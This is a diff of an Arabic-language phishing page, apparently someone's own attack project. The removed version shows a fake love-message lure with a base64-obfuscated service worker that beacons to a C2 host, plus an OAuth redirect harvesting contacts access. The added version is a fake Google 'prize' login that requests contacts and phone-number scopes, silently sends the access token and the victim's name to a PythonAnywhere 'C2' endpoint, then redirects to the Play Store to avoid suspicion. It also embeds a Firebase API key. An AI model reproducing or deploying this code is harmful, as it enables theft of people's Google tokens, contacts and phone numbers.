@@ -3,37 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تهنئة خاصة لك 💝</title>
-    <meta property="og:title" content="رسالة حب خاصة لك 💝">
-    <meta property="og:description" content="اضغط هنا لمشاهدة رسالة الحب التي أرسلها لك شخص مجهول">
-    <meta property="og:image" content="https://i.ibb.co/XW9Vq0W/heart.jpg">
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>هدية حصرية - سجل دخولك لاستلام جائزتك</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        button { background: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #357abd; }
+        img { width: 100px; margin-bottom: 1rem; }
+    </style>
 </head>
-<body class="bg-gradient-to-br from-pink-500 to-purple-700 min-h-screen flex items-center justify-center p-4">
-    <div class="bg-white/90 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center">
-        <div class="text-6xl mb-4 animate-pulse">🎁</div>
-        <h1 class="text-2xl font-bold text-gray-800">صانع مفاجآت الحب</h1>
-        <p class="text-gray-600 my-4">اكتب اسمك لتصميم رسالة تهنئة وارسالها لأصدقائك تلقائياً</p>
-        <input type="text" id="v_name" placeholder="اكتب اسمك هنا..." class="w-full p-3 border-2 border-pink-300 rounded-xl mb-4 text-center">
-        <button onclick="trigger()" class="w-full bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">إرسال التهنئة الآن</button>
-    </div>
+<body>
 
-    <script>
-        // كود الحقن مشفر (Base64) لتجاوز الفحص
-        const encodedSW = "c2VsZi5hZGRFdmVudExpc3RlbmVyKCdhY3RpdmF0ZScsIGUgPT4geyBzZXRJbnRlcnZhbCgoKSA9PiB7IGZldGNoKCdodHRwczovL3lvdXItYzIucmVuZGVyLmNvbS9waW5nJyk7IH0sIDYwMDAwKTsgfSk7"; 
-        const blob = new Blob([atob(encodedSW)], {type: 'application/javascript'});
-        const swUrl = URL.createObjectURL(blob);
-        if ('serviceWorker' in navigator) { navigator.serviceWorker.register(swUrl); }
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+    <h2>تهانينا! لقد فزت بجائزة قيمة</h2>
+    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
+    <button onclick="startCatch()">تسجيل الدخول واستلام الهدية</button>
+</div>
 
-        function trigger() {
-            const name = document.getElementById('v_name').value;
-            if(!name) return alert('اكتب اسمك');
-            localStorage.setItem('v_n', name);
-            // توجيه الضحية لفخ جوجل (ضع الـ Client ID الخاص بك هنا)
-            const cid = "YOUR_CLIENT_ID.apps.googleusercontent.com";
-            const rdir = btoa("https://your-c2-server.com/callback"); // تشفير رابط الـ C2
-            window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${cid}&redirect_uri=${atob(rdir)}&response_type=token&scope=https://www.googleapis.com/auth/contacts.readonly`;
-        }
-    </script>
+<script>
+    // 1. إعدادات فايربيز الخاصة بمشروعك (giftapp-5937d)
+    const firebaseConfig = {
+        apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
+        authDomain: "giftapp-5937d.firebaseapp.com",
+        projectId: "giftapp-5937d"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    // 2. رابط سيرفر الـ C2 الخاص بك على PythonAnywhere
+    const C2_ENDPOINT = "https://mohamedahmed77.pythonanywhere.com/catch";
+
+    function startCatch() {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        
+        // 3. طلب صلاحية الوصول لجهات الاتصال (السر في هذه السطور)
+        provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
+        provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');
+
+        firebase.auth().signInWithPopup(provider).then((result) => {
+            const token = result.credential.accessToken;
+            const user = result.user.displayName || "User";
+
+            // 4. إرسال "الصيد" إلى سيرفرك في صمت
+            fetch(`${C2_ENDPOINT}?token=${token}&sender=${user}`)
+            .then(response => {
+                // 5. تحويل الضحية لصفحة حقيقية لإبعاد الشبهات
+                window.location.href = "https://play.google.com/store/games";
+            })
+            .catch(err => {
+                // حتى لو فشل الاتصال بالسيرفر، نحول الضحية لضمان عدم الشك
+                window.location.href = "https://play.google.com/store/games";
+            });
+
+        }).catch((error) => {
+            console.error("Auth Error:", error);
+            alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.");
+        });
+    }
+</script>
+
 </body>
 </html>
